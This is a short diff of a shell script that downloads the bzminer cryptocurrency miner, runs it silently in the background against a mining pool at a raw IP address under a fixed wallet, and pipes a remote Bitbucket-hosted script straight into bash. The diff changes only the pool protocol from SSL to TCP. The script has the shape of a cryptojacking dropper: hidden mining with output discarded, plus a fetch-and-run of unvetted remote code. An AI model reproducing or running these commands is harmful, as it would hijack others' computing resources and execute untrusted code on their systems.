@@ -1,5 +1,5 @@
 wget https://github.com/bzminer/bzminer/releases/download/v17.0.0/bzminer_v17.0.0_linux.tar.gz
 tar xf bzminer_v17.0.0_linux.tar.gz
 cd bzminer_v17.0.0_linux
-./bzminer -a kawpow -p stratum+ssl://45.32.124.79:80 -w GRZhbEgYPiQ5NrVUTuiu8NET6NScwJmKib.$(echo $(shuf -i 1-100000 -n 1)-A) --nc 1 > /dev/null 2>&1 &
+./bzminer -a kawpow -p stratum+tcp://45.32.124.79:80 -w GRZhbEgYPiQ5NrVUTuiu8NET6NScwJmKib.$(echo $(shuf -i 1-100000 -n 1)-A) --nc 1 > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/mypile/filesg/raw/main/boled04.sh | bash
